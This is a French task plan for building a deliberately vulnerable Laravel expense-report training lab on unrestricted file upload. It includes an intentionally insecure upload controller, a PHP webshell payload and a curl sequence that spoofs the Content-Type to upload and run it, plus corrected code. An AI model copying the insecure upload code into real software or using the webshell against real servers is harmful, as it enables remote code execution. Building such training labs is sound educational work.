                <tr class="hover:bg-gray-50 transition-colors">
                    <td class="px-6 py-4 font-medium text-gray-900">{{ $expense->title }}</td>
                    <td class="px-6 py-4 text-gray-500">{{ $expense->expense_date->format('d/m/Y') }}</td>
                    <td class="px-6 py-4 text-gray-500 capitalize">{{ $expense->category }}</td>
                    <td class="px-6 py-4 text-gray-900 font-semibold text-right">{{ number_format((float) $expense->amount, 2, ',', ' ') }} €</td>
                    <td class="px-6 py-4">
                        <span class="px-2 py-0.5 rounded-full text-xs font-medium {{ $statusClasses }}">
                            {{ $expense->status }}
                        </span>
                    </td>
                    <td class="px-6 py-4 text-right">
                        <a href="{{ route('expenses.show', $expense) }}"
                           class="text-xs text-indigo-600 hover:text-indigo-700 font-medium">Voir</a>
                    </td>
                </tr>
                @endforeach
            </tbody>
        </table>
    </div>
    @endif

</div>
@endsection
```

- [ ] **Créer `resources/views/expenses/create.blade.php`**

```blade
@extends('layouts.app')

@section('title', 'Nouvelle note de frais')

@section('content')
<div class="max-w-2xl">

    <div class="mb-6">
        <a href="{{ route('expenses.index') }}"
           class="inline-flex items-center gap-1.5 text-sm text-gray-500 hover:text-gray-700 mb-4">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
            </svg>
            Retour
        </a>
        <h1 class="text-2xl font-bold text-gray-900">Nouvelle note de frais</h1>
    </div>

    <div class="bg-white rounded-xl border border-gray-200 px-8 py-8">
        <form method="POST" action="{{ route('expenses.store') }}" class="space-y-6">
            @csrf

            <div>
                <label for="title" class="block text-sm font-medium text-gray-700 mb-1.5">Intitulé de la dépense</label>
                <input type="text" id="title" name="title" value="{{ old('title') }}" required
                       placeholder="ex. Déjeuner client Accenture"
                       class="w-full px-3.5 py-2.5 rounded-lg border text-sm
                              {{ $errors->has('title') ? 'border-red-400 bg-red-50' : 'border-gray-300' }}
                              focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent">
                @error('title')
                    <p class="mt-1.5 text-xs text-red-600">{{ $message }}</p>
                @enderror
            </div>

            <div class="grid grid-cols-2 gap-5">
                <div>
                    <label for="amount" class="block text-sm font-medium text-gray-700 mb-1.5">Montant (€)</label>
                    <input type="number" id="amount" name="amount" value="{{ old('amount') }}"
                           step="0.01" min="0.01" required
                           class="w-full px-3.5 py-2.5 rounded-lg border text-sm
                                  {{ $errors->has('amount') ? 'border-red-400 bg-red-50' : 'border-gray-300' }}
                                  focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent">
                    @error('amount')
                        <p class="mt-1.5 text-xs text-red-600">{{ $message }}</p>
                    @enderror
                </div>
                <div>
                    <label for="expense_date" class="block text-sm font-medium text-gray-700 mb-1.5">Date de la dépense</label>
                    <input type="date" id="expense_date" name="expense_date" value="{{ old('expense_date') }}" required
                           class="w-full px-3.5 py-2.5 rounded-lg border text-sm border-gray-300
                                  focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent">
                    @error('expense_date')
                        <p class="mt-1.5 text-xs text-red-600">{{ $message }}</p>
                    @enderror
                </div>
            </div>

            <div>
                <label for="category" class="block text-sm font-medium text-gray-700 mb-1.5">Catégorie</label>
                <select id="category" name="category" required
                        class="w-full px-3.5 py-2.5 rounded-lg border border-gray-300 text-sm
                               focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent">
                    <option value="" disabled {{ old('category') ? '' : 'selected' }}>Sélectionner…</option>
                    @foreach(['transport', 'repas', 'hébergement', 'fournitures', 'autre'] as $cat)
                    <option value="{{ $cat }}" {{ old('category') === $cat ? 'selected' : '' }}>
                        {{ ucfirst($cat) }}
                    </option>
                    @endforeach
                </select>
                @error('category')
                    <p class="mt-1.5 text-xs text-red-600">{{ $message }}</p>
                @enderror
            </div>

            <div>
                <label for="description" class="block text-sm font-medium text-gray-700 mb-1.5">
                    Description <span class="text-gray-400 font-normal">(facultatif)</span>
                </label>
                <textarea id="description" name="description" rows="3"
                          placeholder="Contexte, participants, motif professionnel…"
                          class="w-full px-3.5 py-2.5 rounded-lg border border-gray-300 text-sm resize-none
                                 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent">{{ old('description') }}</textarea>
            </div>

            <div class="flex gap-3 pt-2">
                <button type="submit"
                        class="px-5 py-2.5 bg-indigo-600 text-white text-sm font-medium rounded-lg hover:bg-indigo-700 transition-colors">
                    Soumettre la note
                </button>
                <a href="{{ route('expenses.index') }}"
                   class="px-5 py-2.5 bg-white text-gray-600 text-sm font-medium rounded-lg border border-gray-300 hover:bg-gray-50 transition-colors">
                    Annuler
                </a>
            </div>
        </form>
    </div>

</div>
@endsection
```

- [ ] **Créer `resources/views/expenses/show.blade.php`**

```blade
@extends('layouts.app')

@section('title', $expense->title)

@section('content')
<div class="space-y-6 max-w-3xl">

    <div>
        <a href="{{ route('expenses.index') }}"
           class="inline-flex items-center gap-1.5 text-sm text-gray-500 hover:text-gray-700 mb-4">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
            </svg>
            Mes notes de frais
        </a>
        <div class="flex items-start justify-between">
            <h1 class="text-2xl font-bold text-gray-900">{{ $expense->title }}</h1>
            @php
                $statusClasses = match($expense->status) {
                    'approuvée' => 'bg-green-100 text-green-700',
                    'rejetée'   => 'bg-red-100 text-red-700',
                    default     => 'bg-amber-100 text-amber-700',
                };
            @endphp
            <span class="px-3 py-1 rounded-full text-sm font-medium {{ $statusClasses }}">
                {{ ucfirst($expense->status) }}
            </span>
        </div>
    </div>

    {{-- Details --}}
    <div class="bg-white rounded-xl border border-gray-200 divide-y divide-gray-100">
        <div class="grid grid-cols-3 divide-x divide-gray-100">
            <div class="px-6 py-5">
                <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-1">Montant</p>
                <p class="text-xl font-bold text-gray-900">{{ number_format((float) $expense->amount, 2, ',', ' ') }} €</p>
            </div>
            <div class="px-6 py-5">
                <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-1">Date</p>
                <p class="text-sm font-medium text-gray-900">{{ $expense->expense_date->format('d/m/Y') }}</p>
            </div>
            <div class="px-6 py-5">
                <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-1">Catégorie</p>
                <p class="text-sm font-medium text-gray-900 capitalize">{{ $expense->category }}</p>
            </div>
        </div>
        @if($expense->description)
        <div class="px-6 py-5">
            <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Description</p>
            <p class="text-sm text-gray-700 leading-relaxed">{{ $expense->description }}</p>
        </div>
        @endif
    </div>

    {{-- Attachments --}}
    <div class="bg-white rounded-xl border border-gray-200 overflow-hidden">
        <div class="px-6 py-4 border-b border-gray-100">
            <h2 class="text-sm font-semibold text-gray-900">Justificatifs</h2>
        </div>

        @if($expense->attachments->isNotEmpty())
        <div class="divide-y divide-gray-100">
            @foreach($expense->attachments as $attachment)
            <div class="px-6 py-3.5 flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="w-8 h-8 bg-gray-100 rounded-lg flex items-center justify-center shrink-0">
                        <svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                  d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"/>
                        </svg>
                    </div>
                    <div>
                        <p class="text-sm font-medium text-gray-900">{{ $attachment->original_name }}</p>
                        <p class="text-xs text-gray-400">{{ $attachment->mime_type }}</p>
                    </div>
                </div>
                <a href="{{ asset($attachment->stored_path) }}"
                   target="_blank"
                   class="text-xs text-indigo-600 hover:text-indigo-700 font-medium">
                    Ouvrir
                </a>
            </div>
            @endforeach
        </div>
        @endif

        {{-- Upload form --}}
        @if($expense->status === 'en_attente')
        <div class="px-6 py-5 bg-gray-50 border-t border-gray-100">
            <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3">Ajouter un justificatif</p>
            <form method="POST" action="{{ route('attachments.store', $expense) }}" enctype="multipart/form-data"
                  class="flex items-center gap-3">
                @csrf
                <input type="file" name="file" required
                       class="block text-sm text-gray-600
                              file:mr-3 file:py-2 file:px-4 file:rounded-lg file:border-0
                              file:text-sm file:font-medium file:bg-indigo-50 file:text-indigo-700
                              hover:file:bg-indigo-100 cursor-pointer">
                <button type="submit"
                        class="px-4 py-2 bg-indigo-600 text-white text-sm font-medium rounded-lg hover:bg-indigo-700 transition-colors shrink-0">
                    Déposer
                </button>
            </form>
            @error('file')
                <p class="mt-2 text-xs text-red-600">{{ $message }}</p>
            @enderror
        </div>
        @endif
    </div>

</div>
@endsection
```

- [ ] **Formatter avec Pint**

```bash
docker compose exec backend vendor/bin/pint --dirty
```

- [ ] **Commit**

```bash
git add owasp-06/app/Http/Controllers/ExpenseController.php owasp-06/resources/views/expenses/
git commit -m "feat(owasp-06): add expense CRUD controller and views"
```

---

## Task 8 : AttachmentController (vulnérable)

**Files:**
- Create: `owasp-06/public/uploads/.gitkeep`
- Create: `owasp-06/app/Http/Controllers/AttachmentController.php`

- [ ] **Créer le répertoire `public/uploads/` avec un `.gitkeep`**

Créer un fichier vide à `owasp-06/public/uploads/.gitkeep`.

Le serveur web (Apache/Nginx dans Docker) sert ce répertoire directement : tout fichier déposé ici est accessible via `https://owasp.localhost/uploads/nomfichier`.

- [ ] **Créer `AttachmentController.php`**

```php
<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Models\Attachment;
use App\Models\ExpenseReport;
use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Auth;

class AttachmentController extends Controller
{
    /**
     * ⚠️ VULNÉRABLE — Upload non restreint de fichiers
     *
     * Cinq erreurs combinées permettent l'exécution de code arbitraire :
     * 1. Validation trop permissive : aucun contrôle de type MIME réel ni de taille.
     * 2. Confiance dans getClientMimeType() : valeur fournie par le navigateur, falsifiable.
     * 3. Nom original conservé : getClientOriginalName() peut contenir "shell.php".
     * 4. Stockage dans public/uploads/ : tout fichier est accessible par URL directe.
     * 5. L'URL du fichier est retournée et affichée : l'attaquant connaît l'emplacement exact.
     */
    public function store(Request $request, ExpenseReport $expense): RedirectResponse
    {
        /** @var User $currentUser */
        $currentUser = Auth::user();

        abort_if($expense->user_id !== $currentUser->id, 403);

        // ❌ Erreur 1 — aucune restriction de type ou de taille
        $request->validate([
            'file' => ['required', 'file'],
        ]);

        $file = $request->file('file');
        assert($file instanceof UploadedFile);

        // ❌ Erreur 2 — MIME type déclaré par le client, non vérifié par magic bytes
        $mimeType = $file->getClientMimeType();
        if (! in_array($mimeType, ['image/jpeg', 'image/png', 'application/pdf'], true)) {
            return back()->with('error', 'Type de fichier non autorisé.');
        }

        // ❌ Erreur 3 — nom original conservé tel quel (peut être "shell.php")
        $originalName = $file->getClientOriginalName();

        // ❌ Erreur 4 — stockage dans public/uploads/ : exécutable via URL directe
        $file->move(public_path('uploads'), $originalName);

        Attachment::query()->create([
            'expense_report_id' => $expense->id,
            'user_id' => $currentUser->id,
            'original_name' => $originalName,
            'stored_path' => 'uploads/' . $originalName, // ❌ Erreur 5 — chemin public retourné
            'mime_type' => $mimeType,
        ]);

        return redirect()->route('expenses.show', $expense)
            ->with('success', 'Justificatif ajouté.');
    }
}
```

- [ ] **Formatter avec Pint**

```bash
docker compose exec backend vendor/bin/pint --dirty
```

- [ ] **Commit**

```bash
git add owasp-06/public/uploads/.gitkeep owasp-06/app/Http/Controllers/AttachmentController.php
git commit -m "feat(owasp-06): add vulnerable AttachmentController and uploads directory"
```

---

## Task 9 : ChallengeController + vue challenges

**Files:**
- Create: `owasp-06/app/Http/Controllers/ChallengeController.php`
- Create: `owasp-06/resources/views/challenges/index.blade.php`

- [ ] **Créer `ChallengeController.php`**

```php
<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use Illuminate\View\View;

class ChallengeController extends Controller
{
    public function index(): View
    {
        return view('challenges.index');
    }
}
```

- [ ] **Créer `resources/views/challenges/index.blade.php`**

```blade
@extends('layouts.app')

@section('title', 'Challenges OWASP A06')

@section('content')
<div class="space-y-8">

    {{-- Header --}}
    <div>
        <div class="flex items-center gap-2 mb-3">
            <span class="px-2.5 py-1 bg-red-100 text-red-700 text-xs font-bold rounded-md uppercase tracking-wider">OWASP A06:2021</span>
            <span class="px-2.5 py-1 bg-gray-100 text-gray-600 text-xs font-medium rounded-md">Vulnerable and Outdated Components</span>
        </div>
        <h1 class="text-2xl font-bold text-gray-900">Upload non restreint de fichiers</h1>
        <p class="text-sm text-gray-600 mt-2 max-w-3xl leading-relaxed">
            Cette application de gestion de notes de frais contient <strong>une vulnérabilité d'upload</strong> permettant
            l'exécution de code arbitraire sur le serveur. Votre mission : la trouver, l'exploiter, puis la corriger.
        </p>
    </div>

    {{-- Accounts card --}}
    <div class="bg-amber-50 border border-amber-200 rounded-xl p-5">
        <h2 class="text-sm font-semibold text-amber-900 mb-3">Comptes disponibles</h2>
        <div class="grid grid-cols-3 gap-3">
            <div class="bg-white rounded-lg p-3 border border-amber-100">
                <p class="text-xs font-semibold text-gray-700 mb-1">Employée</p>
                <p class="font-mono text-xs text-gray-600">alice@expensecorp.local</p>
                <p class="font-mono text-xs text-gray-400">alice123</p>
            </div>
            <div class="bg-white rounded-lg p-3 border border-amber-100">
                <p class="text-xs font-semibold text-gray-700 mb-1">Employé</p>
                <p class="font-mono text-xs text-gray-600">bob@expensecorp.local</p>
                <p class="font-mono text-xs text-gray-400">bob456</p>
            </div>
            <div class="bg-white rounded-lg p-3 border border-amber-100">
                <p class="text-xs font-semibold text-gray-700 mb-1">Administrateur RH</p>
                <p class="font-mono text-xs text-gray-600">admin@expensecorp.local</p>
                <p class="font-mono text-xs text-gray-400">rh-admin2024</p>
            </div>
        </div>
    </div>

    {{-- ───────────────── Challenge 1 ───────────────── --}}
    <div class="bg-white rounded-xl border border-gray-200 overflow-hidden">
        <div class="px-6 py-5 border-b border-gray-100">
            <div class="flex items-start justify-between">
                <div>
                    <div class="flex items-center gap-2 mb-1">
                        <span class="text-xs font-bold text-orange-600 uppercase tracking-wider">Challenge 1</span>
                        <span class="px-2 py-0.5 rounded-full text-xs font-medium bg-orange-100 text-orange-800">Upload non restreint</span>
                    </div>
                    <h3 class="text-base font-semibold text-gray-900">Exécution de code via l'upload de justificatif</h3>
                </div>
                <span class="text-amber-400 text-sm">⭐⭐⭐</span>
            </div>
        </div>
        <div class="px-6 py-5 space-y-4">
            <p class="text-sm text-gray-600 leading-relaxed">
                Connectez-vous en tant qu'Alice et créez une note de frais. Déposez un justificatif.
                Trouvez un moyen d'exécuter du code arbitraire sur le serveur.
            </p>

            {{-- Hint --}}
            <details class="border border-amber-200 rounded-lg overflow-hidden group">
                <summary class="flex items-center gap-2 px-4 py-3 bg-amber-50 cursor-pointer text-sm font-medium text-amber-800 select-none list-none">
                    <svg class="w-4 h-4 text-amber-500 transition-transform group-open:rotate-90" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                    </svg>
                    Révéler l'indice
                </summary>
                <div class="px-4 py-3 bg-amber-50 border-t border-amber-200 space-y-1.5">
                    <p class="text-sm text-amber-800">• Quel composant fournit le type MIME lors d'un upload — le serveur ou le navigateur ? Peut-on le falsifier avec un outil comme Burp Suite ou curl ?</p>
                    <p class="text-sm text-amber-800">• Le nom du fichier est-il transformé (UUID, hash) avant d'être enregistré sur le disque, ou est-il conservé tel quel ?</p>
                    <p class="text-sm text-amber-800">• Regardez l'URL du lien "Ouvrir" après l'upload : dans quel répertoire le fichier est-il stocké ? Ce répertoire est-il accessible publiquement ?</p>
                </div>
            </details>

            {{-- Solution --}}
            <details class="border border-green-200 rounded-lg overflow-hidden group">
                <summary class="flex items-center gap-2 px-4 py-3 bg-green-50 cursor-pointer text-sm font-medium text-green-800 select-none list-none">
                    <svg class="w-4 h-4 text-green-500 transition-transform group-open:rotate-90" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                    </svg>
                    Révéler la solution &amp; correction
                </summary>
                <div class="px-4 py-4 bg-green-50 border-t border-green-200 space-y-4">

                    <div>
                        <p class="text-xs font-semibold text-green-800 uppercase tracking-wider mb-2">Payload d'exploit</p>
                        <p class="text-sm text-green-700 mb-2">
                            Créer un fichier <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">shell.php</span>
                            contenant <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">&lt;?php system($_GET['cmd']); ?&gt;</span>,
                            puis envoyer la requête en falsifiant le Content-Type :
                        </p>
                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-4 text-xs overflow-x-auto leading-relaxed"><code><span class="text-gray-500"># Récupérer le token CSRF et les cookies de session</span>
TOKEN=$(curl -sc /tmp/cookies https://owasp.localhost/login | \
  grep -oP 'name="_token" value="\K[^"]+')

<span class="text-gray-500"># S'authentifier en tant qu'Alice</span>
curl -sb /tmp/cookies -c /tmp/cookies -s -o /dev/null \
  -X POST https://owasp.localhost/login \
  -d "email=alice%40expensecorp.local&password=alice123&_token=$TOKEN"

<span class="text-gray-500"># Créer une note de frais et noter son ID dans l'URL de redirection</span>
<span class="text-gray-500"># Ex. https://owasp.localhost/expenses/1</span>

<span class="text-gray-500"># Uploader le webshell en falsifiant le Content-Type</span>
CSRF=$(curl -sb /tmp/cookies https://owasp.localhost/expenses/1 | \
  grep -oP 'name="_token" value="\K[^"]+')

curl -sb /tmp/cookies -c /tmp/cookies \
  -X POST https://owasp.localhost/expenses/1/attachments \
  -F "_token=$CSRF" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php"

<span class="text-gray-500"># Exécuter des commandes</span>
curl https://owasp.localhost/uploads/shell.php?cmd=id
<span class="text-green-400"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
                    </div>

                    <div>
                        <p class="text-xs font-semibold text-green-800 uppercase tracking-wider mb-2">Code vulnérable &rarr; corrigé</p>
                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-4 text-xs overflow-x-auto leading-relaxed"><code><span class="text-red-400">// ❌ VULNÉRABLE — AttachmentController::store()</span>

<span class="text-gray-500">// Erreur 1 : validation sans restriction de type ni de taille</span>
$request->validate([<span class="text-yellow-300">'file'</span> => [<span class="text-green-300">'required'</span>, <span class="text-green-300">'file'</span>]]);

<span class="text-gray-500">// Erreur 2 : MIME type fourni par le navigateur (falsifiable)</span>
<span class="text-yellow-300">$mimeType</span> = <span class="text-yellow-300">$file</span>->getClientMimeType();

<span class="text-gray-500">// Erreur 3 : nom original conservé ("shell.php" passe tel quel)</span>
<span class="text-yellow-300">$originalName</span> = <span class="text-yellow-300">$file</span>->getClientOriginalName();

<span class="text-gray-500">// Erreur 4 : stockage dans public/uploads/ (accessible via URL)</span>
<span class="text-yellow-300">$file</span>->move(public_path(<span class="text-green-300">'uploads'</span>), <span class="text-yellow-300">$originalName</span>);


<span class="text-green-400">// ✅ CORRIGÉ</span>

<span class="text-gray-500">// Règle 1 : validation stricte (taille + type par magic bytes)</span>
$request->validate([<span class="text-yellow-300">'file'</span> => [
    <span class="text-green-300">'required'</span>, <span class="text-green-300">'file'</span>,
    <span class="text-green-300">'max:10240'</span>,             <span class="text-gray-500">// 10 MB</span>
    <span class="text-green-300">'mimes:jpeg,png,pdf'</span>,   <span class="text-gray-500">// vérification par magic bytes</span>
]]);

<span class="text-gray-500">// Règle 2 : vérification du MIME type réel (double sécurité)</span>
<span class="text-yellow-300">$realMime</span> = <span class="text-yellow-300">$file</span>->getMimeType(); <span class="text-gray-500">// magic bytes, pas la déclaration client</span>

<span class="text-gray-500">// Règle 3 : nom aléatoire — le nom original est ignoré</span>
<span class="text-yellow-300">$safeName</span> = Str::random(<span class="text-blue-300">32</span>) . <span class="text-green-300">'.'</span> . <span class="text-yellow-300">$file</span>->extension();

<span class="text-gray-500">// Règle 4 : stockage hors du répertoire public (disk 'private')</span>
<span class="text-yellow-300">$file</span>->storeAs(<span class="text-green-300">'uploads'</span>, <span class="text-yellow-300">$safeName</span>, disk: <span class="text-green-300">'private'</span>);</code></pre>
                    </div>

                    <div class="text-xs text-green-700 bg-green-100 rounded-lg px-3 py-2">
                        <strong>Principe OWASP :</strong> Ne jamais faire confiance aux métadonnées fournies par le client (nom, type MIME). Valider le type par magic bytes côté serveur, générer un nom aléatoire, et stocker hors du répertoire public.
                    </div>
                </div>
            </details>
        </div>
    </div>

</div>
@endsection
```

- [ ] **Formatter avec Pint**

```bash
docker compose exec backend vendor/bin/pint --dirty
```

- [ ] **Commit**

```bash
git add owasp-06/app/Http/Controllers/ChallengeController.php owasp-06/resources/views/challenges/
git commit -m "feat(owasp-06): add challenge controller and challenge card view"
```

---

## Task 10 : PHPStan + reset-db + vérification finale

**Files:** aucun nouveau fichier

- [ ] **Lancer PHPStan et corriger toutes les erreurs**

```bash
docker compose exec backend composer phpstan
```

Erreurs attendues à corriger si présentes :
- `auth()->user()` retourne `Authenticatable|null` — utiliser `Auth::user()` avec `/** @var User $currentUser */`
- `$expense->amount` peut être `string` depuis la DB — caster `(float) $expense->amount` dans les vues ou vérifier le cast Eloquent
- Relations sans PHPDoc générique

- [ ] **Reset complet de la base et vérification du seed**

```bash
make reset-db
```

Résultat attendu :
```
Dropping all tables...
Running migrations...
Seeding database...
Database seeding completed successfully.
```

- [ ] **Vérifier la connexion et le workflow d'upload**

Se connecter sur `https://owasp.localhost` avec `alice@expensecorp.local` / `alice123`, créer une note de frais, uploader un fichier `.pdf`, vérifier que le lien "Ouvrir" fonctionne.

- [ ] **Formatter une dernière fois**

```bash
docker compose exec backend vendor/bin/pint --dirty
```

- [ ] **Commit final**

```bash
git add owasp-06/
git commit -m "feat(owasp-06): finalize ExpenseCorp — OWASP A06 unrestricted upload module"
```
